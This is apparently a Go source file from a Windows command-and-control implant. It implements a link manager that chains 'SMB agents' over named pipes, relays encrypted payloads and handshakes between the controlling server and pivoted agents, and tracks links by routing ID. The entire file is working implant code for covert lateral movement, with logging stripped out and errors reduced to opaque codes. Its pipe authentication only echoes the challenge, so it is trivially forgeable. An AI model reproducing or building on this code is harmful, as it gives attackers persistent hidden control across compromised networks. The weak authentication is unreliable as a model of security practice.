//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	// "log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// LinkedAgent represents a connected SMB agent
type LinkedAgent struct {
	RoutingID    string    // Short routing ID (assigned by this agent)
	PipePath     string    // Full pipe path (\\server\pipe\name)
	Conn         net.Conn  // Active pipe connection
	Connected    time.Time // When the link was established
	LastSeen     time.Time // Last successful communication
	IsActive     bool      // Whether the link is active
	mu           sync.Mutex
}

// LinkManager manages connections to linked SMB agents
type LinkManager struct {
	mu           sync.RWMutex
	links        map[string]*LinkedAgent // routingID -> LinkedAgent
	pipeToRoute  map[string]string       // pipePath -> routingID (for dedup)
	nextID       uint32                  // Atomic counter for generating routing IDs
	outboundData chan *LinkDataOut       // Data received from linked agents, to be sent to server

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
	responseMu       sync.RWMutex

	// Unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// LinkDataOut represents data from a linked agent to be forwarded to the server
type LinkDataOut struct {
	RoutingID string `json:"r"` // Routing ID
	Payload   string `json:"p"` // Base64 encoded, encrypted payload
}

// LinkDataIn represents data from the server destined for a linked agent
type LinkDataIn struct {
	RoutingID string `json:"r"` // Routing ID
	Payload   string `json:"p"` // Base64 encoded payload
}

var (
	linkManager     *LinkManager
	linkManagerOnce sync.Once
)

// GetLinkManager returns the singleton link manager
func GetLinkManager() *LinkManager {
	linkManagerOnce.Do(func() {
		linkManager = &LinkManager{
			links:               make(map[string]*LinkedAgent),
			pipeToRoute:         make(map[string]string),
			outboundData:        make(chan *LinkDataOut, 100),
			responseChannels:    make(map[string]chan *LinkDataOut),
			unlinkNotifications: make(chan string, 100),
		}
	})
	return linkManager
}

// GenerateRoutingID creates a short, unique routing ID
func (lm *LinkManager) GenerateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// Link establishes a connection to an SMB agent via named pipe
func (lm *LinkManager) Link(pipePath string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this pipe
	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf(Err(E5))
		}
	}

	// Connect to the named pipe
	conn, err := connectToPipe(pipePath)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Perform lightweight authentication with the SMB agent
	if err := performLinkAuth(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.GenerateRoutingID()

	// Create linked agent entry
	link := &LinkedAgent{
		RoutingID: routingID,
		PipePath:  pipePath,
		Conn:      conn,
		Connected: time.Now(),
		LastSeen:  time.Now(),
		IsActive:  true,
	}

	// Store the link
	lm.links[routingID] = link
	lm.pipeToRoute[pipePath] = routingID

	// Start goroutine to handle incoming data from the SMB agent
	go lm.handleIncomingData(link)

	// log.Printf("[LinkManager] Successfully linked to %s (routing_id: %s)", pipePath, routingID)
	return routingID, nil
}

// Unlink disconnects from an SMB agent
func (lm *LinkManager) Unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent to server
	select {
	case lm.unlinkNotifications <- routingID:
		// log.Printf("[LinkManager] Queued unlink notification for routing_id: %s", routingID)
	default:
		// log.Printf("[LinkManager] Warning: Unlink notification queue full, notification dropped for %s", routingID)
	}

	// Remove from maps
	delete(lm.pipeToRoute, link.PipePath)
	delete(lm.links, routingID)

	// log.Printf("[LinkManager] Unlinked from %s (routing_id: %s)", link.PipePath, routingID)
	return nil
}

// GetLink returns a linked agent by routing ID
func (lm *LinkManager) GetLink(routingID string) (*LinkedAgent, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// GetActiveLinks returns all active linked agents
func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*LinkedAgent
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// ForwardToLinkedAgent sends data from the server to a linked agent
func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) error {
	link, exists := lm.GetLink(routingID)
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf(Err(E4))
	}

	// Send the payload over the pipe
	message := map[string]string{
		"type":    "data",
		"payload": payload,
	}

	data, err := json.Marshal(message)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Write length-prefixed message
	if err := writeMessage(link.Conn, data); err != nil {
		link.IsActive = false
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	link.LastSeen = time.Now()
	return nil
}

// ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
// Returns the response payload or error if timeout occurs
func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command
	if err := lm.ForwardToLinkedAgent(routingID, payload); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		// log.Printf("[LinkManager] Received synchronous response from %s", routingID)
		return response, nil
	case <-time.After(timeout):
		// log.Printf("[LinkManager] Timeout waiting for response from %s (waited %v)", routingID, timeout)
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// WaitForLinkData waits for data from a specific routing ID with timeout
// Used after posting to server to wait for handshake response
func (lm *LinkManager) WaitForLinkData(routingID string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Wait for response with timeout
	select {
	case response := <-respChan:
		// log.Printf("[LinkManager] Received data for %s via wait channel", routingID)
		return response, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf(Err(E9))
	}
}

// GetOutboundData returns data that needs to be sent to the server
func (lm *LinkManager) GetOutboundData() []*LinkDataOut {
	var data []*LinkDataOut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// GetUnlinkNotifications returns routing IDs that have been unlinked and need to be reported to the server
func (lm *LinkManager) GetUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			// log.Printf("[LinkManager] GetUnlinkNotifications: Drained routing_id %s from channel", routingID)
			notifications = append(notifications, routingID)
		default:
			if len(notifications) > 0 {
				// log.Printf("[LinkManager] GetUnlinkNotifications: Returning %d notifications", len(notifications))
			}
			return notifications
		}
	}
}

// handleIncomingData reads data from a linked agent and queues it for the server
func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
	defer func() {
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
		// log.Printf("[LinkManager] Link handler exited for routing_id: %s", link.RoutingID)
	}()

	for {
		// Read length-prefixed message from pipe
		data, err := readMessage(link.Conn)
		if err != nil {
			// log.Printf("[LinkManager] Error reading from link %s: %v", link.RoutingID, err)
			return
		}

		// Parse the message
		var message map[string]string
		if err := json.Unmarshal(data, &message); err != nil {
			// log.Printf("[LinkManager] Invalid message from link %s: %v", link.RoutingID, err)
			continue
		}

		switch message["type"] {
		case "data":
			// Build outbound data
			outbound := &LinkDataOut{
				RoutingID: link.RoutingID,
				Payload:   message["payload"],
			}

			// Check if someone is waiting synchronously for this response
			lm.responseMu.RLock()
			respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
			lm.responseMu.RUnlock()

			if hasSyncWaiter {
				// Send to synchronous waiter (non-blocking)
				select {
				case respChan <- outbound:
					// log.Printf("[LinkManager] Delivered data from %s to synchronous waiter", link.RoutingID)
				default:
					// Channel full or closed, fall back to async queue
					// log.Printf("[LinkManager] Sync channel full, queuing data from %s", link.RoutingID)
					lm.queueOutboundData(outbound)
				}
			} else {
				// No synchronous waiter, queue for normal async processing
				// log.Printf("[LinkManager] Received data response from link %s, queuing for server", link.RoutingID)
				lm.queueOutboundData(outbound)
			}

		case "handshake":
			// Initial handshake from SMB agent - queue for server
			outbound := &LinkDataOut{
				RoutingID: link.RoutingID,
				Payload:   message["payload"],
			}
			select {
			case lm.outboundData <- outbound:
				// log.Printf("[LinkManager] Queued handshake from %s", link.RoutingID)
			default:
				// log.Printf("[LinkManager] Outbound queue full, dropping handshake from %s", link.RoutingID)
			}

		case "disconnect":
			// log.Printf("[LinkManager] Received disconnect from %s", link.RoutingID)
			return

		default:
			// log.Printf("[LinkManager] Unknown message type from %s: %s", link.RoutingID, message["type"])
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// queueOutboundData is a helper to queue data for async server delivery
func (lm *LinkManager) queueOutboundData(outbound *LinkDataOut) {
	select {
	case lm.outboundData <- outbound:
		// log.Printf("[LinkManager] Successfully queued data from %s for server", outbound.RoutingID)
	default:
		// log.Printf("[LinkManager] Outbound queue full, dropping data from %s", outbound.RoutingID)
	}
}

// ListLinks returns a summary of all linked agents
func (lm *LinkManager) ListLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf("Active Links (%d):\n", len(lm.links))
	for routingID, link := range lm.links {
		status := "active"
		if !link.IsActive {
			status = "inactive"
		}
		result += fmt.Sprintf("  [%s] %s - %s (connected: %s, last seen: %s)\n",
			routingID, link.PipePath, status,
			link.Connected.Format("15:04:05"),
			link.LastSeen.Format("15:04:05"))
	}
	return result
}

// Helper functions for pipe communication

func connectToPipe(pipePath string) (net.Conn, error) {
	// Use DialTimeout for Windows named pipes
	timeout := 30 * time.Second
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn, err := dialPipe(pipePath)
		if err == nil {
			return conn, nil
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil, fmt.Errorf(Err(E9))
}

func performLinkAuth(conn net.Conn) error {
	// Lightweight authentication:
	// 1. Read challenge from SMB agent
	// 2. Sign with our key
	// 3. Send response

	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Read challenge
	challenge, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Simple challenge-response for now
	// In production, use proper crypto
	response := append([]byte("AUTH:"), challenge...)

	if err := writeMessage(conn, response); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Read confirmation
	confirm, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	if string(confirm) != "OK" {
		return fmt.Errorf(Err(E3))
	}

	return nil
}

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{"type": "disconnect"}
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Read 4-byte length header
	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf(Err(E2))
	}

	// Read data
	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}
